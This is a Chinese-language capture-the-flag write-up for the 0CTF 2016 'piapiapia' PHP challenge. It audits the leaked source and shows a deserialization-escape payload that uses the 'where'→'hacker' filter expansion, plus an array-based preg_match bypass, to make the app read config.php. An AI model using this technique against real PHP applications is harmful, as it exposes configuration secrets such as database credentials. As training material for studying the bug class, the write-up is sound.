# \[0CTF 2016]piapiapia

## \[0CTF 2016]piapiapia

## 考点

* 反序列化逃逸

## wp

www.zip泄露源码，下载审计。

index.php有登录功能，先看index.php。包含class.php，使用session判断是否登录，登录了就跳转profile.php

```php
<?php
require_once('class.php');
if($_SESSION['username']) {
    header('Location: profile.php');
    exit;
}
```

然后到登录功能，获取的username和password长度必须在\[3,16]这个区间内，然后使用`$user->login`判断账号密码是否正确，这个函数在class.php中。

```php
if($_POST['username'] && $_POST['password']) {
	$username = $_POST['username'];
	$password = $_POST['password'];
	if(strlen($username) < 3 or strlen($username) > 16) 
		die('Invalid user name');
	if(strlen($password) < 3 or strlen($password) > 16) 
		die('Invalid password');
	if($user->login($username, $password)) {
		$_SESSION['username'] = $username;
		header('Location: profile.php');
		exit;}
	else {  die('Invalid user name or password');  }
}else{}
```

到class.php找`$user`的定义。在config.php中定义了<mark style="color:orange;">flag</mark>和`$config`数组用于保存MySQL连接的相关参数。

在`mysql::filter()`处把`'`和`\\`替换成`_`，把`select`，`insert`，`update`，`where`和`delete`替换成`hacker`，可能会有反序列化逃逸。

`user::login()`先对POST的数据用`mysql::filter()`进行替换，然后在`mysql::select()`判断账号密码是否正确

```php
require('config.php');
session_start();

class mysql {
	private $link = null;
	public function filter($string) {
		$escape = array('\'', '\\\\');
		$escape = '/' . implode('|', $escape) . '/';
		$string = preg_replace($escape, '_', $string);

		$safe = array('select', 'insert', 'update', 'delete', 'where');
		$safe = '/' . implode('|', $safe) . '/i';
		return preg_replace($safe, 'hacker', $string);
	}
	public function select($table, $where, $ret = '*') {
		$sql = "SELECT $ret FROM $table WHERE $where";
		$result = mysql_query($sql, $this->link);
		return mysql_fetch_object($result);
	}
}
class user extends mysql{
	private $table = 'users';
	public function login($username, $password) {
		$username = parent::filter($username);
		$password = parent::filter($password);

		$where = "username = '$username'";
		$object = parent::select($this->table, $where);
		if ($object && $object->password === md5($password)) {
			return true;
		} else {
			return false;
		}
	}
}
$user = new user();
$user->connect($config);
```

再看注册，和登录要求类似，取的username和password长度必须在\[3,16]这个区间内。然后调用`user::is_exists`判断用户是否村，调用`user::register`函数进行注册

```php
require_once('class.php');
if($_POST['username'] && $_POST['password']) {
	$username = $_POST['username'];
	$password = $_POST['password'];
	if(strlen($username) < 3 or strlen($username) > 16) 
		die('Invalid user name');
	if(strlen($password) < 3 or strlen($password) > 16) 
		die('Invalid password');
	if(!$user->is_exists($username)) {
		$user->register($username, $password);
		echo 'Register OK!<a href="index.php">Please Login</a>';		
	}else {  die('User name Already Exists');  }}
```

user::is\_exists()对输入进行`mysql::filter()`替换，再去执行`mysql::select()`判断用户是否存在

user::register()对输入进行`mysql::filter()`替换，再去执行`mysql::`insert`()`插入新用户

```php
class user extends mysql{
	private $table = 'users';
	public function is_exists($username) {
		$username = parent::filter($username);
		$where = "username = '$username'";
		return parent::select($this->table, $where);
	}
	public function register($username, $password) {
		$username = parent::filter($username);
		$password = parent::filter($password);
		$key_list = Array('username', 'password');
		$value_list = Array($username, md5($password));
		return parent::insert($this->table, $key_list, $value_list);
	}}
class mysql {
	private $link = null;
	public function select($table, $where, $ret = '*') {
		$sql = "SELECT $ret FROM $table WHERE $where";
		$result = mysql_query($sql, $this->link);
		return mysql_fetch_object($result);
	}
	public function insert($table, $key_list, $value_list) {
		$key = implode(',', $key_list);
		$value = '\'' . implode('\',\'', $value_list) . '\''; 
		$sql = "INSERT INTO $table ($key) VALUES ($value)";
		return mysql_query($sql);
	}}
```

然后看profile.php，调用`user::show_profile()`函数获取profile，然后反序列化profile，获取`phone`，`email`和`nickname`三个属性，最后读取`photo`属性对应的文件

```php
<?php
	require_once('class.php');
	if($_SESSION['username'] == null) {
		die('Login First');	
	}
	$username = $_SESSION['username'];
	$profile=$user->show_profile($username);
	if($profile  == null) {
		header('Location: update.php');
	}
	else {
		$profile = unserialize($profile);
		$phone = $profile['phone'];
		$email = $profile['email'];
		$nickname = $profile['nickname'];
		$photo = base64_encode(file_get_contents($profile['photo']));
?>
```

`user::show_profile()`

```php
class user extends mysql{
	public function show_profile($username) {
		$username = parent::filter($username);
		$where = "username = '$username'";
		$object = parent::select($this->table, $where);
		return $object->profile;
	}}
```

还有最后一个update.php，POST获取`phone`，`email`和`nickname`三个属性，然后获取上传的`photo`文件。`phone`是11位数字，`email`只由字母数字下划线组成，`nickname`只由字母数字下划线组成，并且长度不超过10。

这里前面两个`preg_match`都是有`!`表示取逆，第三个`nickname`的限制就没有，也就是这里返回FALSE，而<mark style="color:orange;">传入数组</mark><mark style="color:orange;">`preg_match`</mark><mark style="color:orange;">会使返回FALSE，这就绕过限制了。</mark>

```php
<?php
require_once('class.php');
if($_SESSION['username'] == null) {
	die('Login First');	
}
if($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {
	$username = $_SESSION['username'];
	if(!preg_match('/^\d{11}$/', $_POST['phone']))
		die('Invalid phone');
	if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))
		die('Invalid email');
	if(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)
		die('Invalid nickname');
```

对于上传的文件，没有过滤，保存为md5(name)，也没有后缀。然后将上传的内容（四个字段），再使用`user::update_profile()`执行update语句，进行更新。

```php
$file = $_FILES['photo'];
if($file['size'] < 5 or $file['size'] > 1000000)
    die('Photo size error');
move_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));
$profile['phone'] = $_POST['phone'];
$profile['email'] = $_POST['email'];
$profile['nickname'] = $_POST['nickname'];
$profile['photo'] = 'upload/' . md5($file['name']);
$user->update_profile($username, serialize($profile));
```

`user::update_profile()`

```php
class user extends mysql{
    private $table = 'users';
    public function update_profile($username, $new_profile) {
        $username = parent::filter($username);
        $new_profile = parent::filter($new_profile);
        $where = "username = '$username'";
        return parent::update($this->table, 'profile', $new_profile, $where);
    }}
class mysql {
    private $link = null;
    public function update($table, $key, $value, $where) {
        $sql = "UPDATE $table SET $key = '$value' WHERE $where";
        return mysql_query($sql);
    }}
```

在update.php页面更新profile的时候对profile进行serialize操作，在profile.php读取profile时进行反序列化操作，并且更新profile会使用`mysql::filter()`进行替换，因此会导致PHP的反序列化逃逸。在profile.php读取profile时，会把profile中photo字段对应的文件读取并输出，所以这里逃逸只要修改profile\['photo']为config.php即可。

这是正常序列化的结果

`a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"111@qq.com";s:8:"nickname";s:4:"test";s:5:"photo";s:39:"upload/b52f6f78c93f7934d640cc67ae99fbd1";}`

目标结果

`a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"111@qq.com";s:8:"nickname";s:4:"hacker`<mark style="color:red;">`";s:5:"photo";s:10:"config.php";}`</mark>

如果`nickname`输入3个where，经过`filter`函数处理后结果如下

`a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"111@qq.com";s:8:"nickname";s:15:"`<mark style="color:orange;">`hackerhackerhac`</mark><mark style="color:red;">`ker`</mark>`";s:5:"photo";s:39:"upload/b52f6f78c93f7934d640cc67ae99fbd1";}`

这样就逃逸了3个字符，目标是逃逸34个字符，那就需要34个where

payload测试

```php
<?php
function filter($string) {
	$escape = array('\'', '\\\\');
	$escape = '/' . implode('|', $escape) . '/';
	$string = preg_replace($escape, '_', $string);

	$safe = array('select', 'insert', 'update', 'delete', 'where');
	$safe = '/' . implode('|', $safe) . '/i';
	return preg_replace($safe, 'hacker', $string);
}

$profile['phone'] = '11111111111';
$profile['email'] = '111@qq.com';
$profile['nickname'] = 'wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere";}s:5:"photo";s:10:"config.php";}';
$profile['photo'] = 'upload/' . md5('123.txt');
$s = serialize($profile);
echo $s."<br>";
echo filter($s);
```

得到结果

`a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"111@qq.com";s:8:"nickname";s:204:"`<mark style="color:orange;">`wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere`</mark><mark style="color:red;">`";}s:5:"photo";s:10:"config.php";}`</mark>`";s:5:"photo";s:39:"upload/b52f6f78c93f7934d640cc67ae99fbd1";}`&#x20;

`a:4:{s:5:"phone";s:11:"11111111111";s:5:"email";s:10:"111@qq.com";s:8:"nickname";s:204:"`<mark style="color:orange;">`hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker`</mark><mark style="color:red;">`";}s:5:"photo";s:10:"config.php";}`</mark>`";s:5:"photo";s:39:"upload/b52f6f78c93f7934d640cc67ae99fbd1";}`

payload：

![](<../../.gitbook/assets/image (17) (1).png>)

再去访问profile.php查看图片的内容即可

![](<../../.gitbook/assets/image (22) (1) (1).png>)
